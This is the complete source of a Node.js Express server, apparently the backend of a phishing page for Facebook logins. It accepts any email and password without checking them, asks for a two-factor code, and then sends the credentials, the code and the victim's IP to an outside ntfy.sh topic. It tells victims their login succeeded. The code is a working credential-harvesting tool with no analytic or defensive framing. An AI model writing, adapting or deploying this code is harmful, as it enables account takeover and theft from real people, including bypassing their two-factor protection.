const express = require('express');
const cors = require('cors');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// ntfy topic (your phone will receive notifications)
const NTFY_TOPIC = 'fblogins-Alerts';

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Temporary storage for pending login (to link step 1 and step 2)
const pendingLogins = new Map();

// Send notification to ntfy
async function sendToNtfy(email, password, code, ip) {
    let message = `🔐 LOGIN ATTEMPT\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
    if (code) {
        message += `\n📱 Auth Code: ${code}`;
    }
    message += `\n🌍 IP: ${ip}\n⏰ Time: ${new Date().toString()}`;
    
    try {
        await axios.post(`https://ntfy.sh/${NTFY_TOPIC}`, message, {
            headers: {
                'Title': code ? '🔐 2FA Code Submitted' : '🔐 Login Step 1',
                'Priority': 'high',
                'Tags': 'warning,lock'
            }
        });
        console.log('✅ ntfy notification sent');
    } catch (error) {
        console.log('❌ ntfy error:', error.message);
    }
}

// Step 1: Always accept email/password (no validation)
app.post('/api/login', (req, res) => {
    const { identifier, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Generate a random session ID for this login attempt
    const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 6);
    
    // Store the credentials temporarily (will expire in 10 minutes)
    pendingLogins.set(sessionId, {
        email: identifier,
        password: password,
        ip: ip,
        expires: Date.now() + 10 * 60 * 1000
    });
    
    // Send first notification (email + password) to your phone
    sendToNtfy(identifier, password, null, ip);
    
    // Always return success and ask for 2FA code
    res.json({ 
        success: true, 
        requires2FA: true,
        sessionId: sessionId
    });
});

// Step 2: Receive the authentication code
app.post('/api/verify-2fa', (req, res) => {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
        return res.status(400).json({ error: 'Missing session or code' });
    }
    
    const pending = pendingLogins.get(sessionId);
    
    if (!pending) {
        return res.status(400).json({ error: 'Session expired. Please login again.' });
    }
    
    if (Date.now() > pending.expires) {
        pendingLogins.delete(sessionId);
        return res.status(400).json({ error: 'Session expired. Please login again.' });
    }
    
    // Send second notification with the authentication code
    sendToNtfy(pending.email, pending.password, code, pending.ip);
    
    // Clean up
    pendingLogins.delete(sessionId);
    
    // Always succeed (no code validation)
    res.json({ 
        success: true, 
        message: 'Login successful!',
        user: { name: pending.email.split('@')[0] || 'User' } // dummy name
    });
});

// Health check
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
});

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`ntfy topic: ${NTFY_TOPIC}`);
});
